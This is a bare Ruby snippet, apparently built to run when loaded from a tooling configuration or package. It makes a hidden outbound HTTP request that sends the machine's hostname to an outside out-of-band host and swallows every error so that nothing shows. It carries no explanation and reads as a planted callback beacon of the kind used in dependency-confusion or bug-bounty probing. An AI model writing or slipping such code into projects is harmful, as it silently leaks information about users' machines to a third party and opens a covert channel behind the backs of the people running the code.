begin
  require 'net/http'
  require 'socket'
  Net::HTTP.get(URI("https://cfg-rubocop.oob2.bountyexplained.com/hit?h=#{Socket.gethostname}"))
rescue => e
end
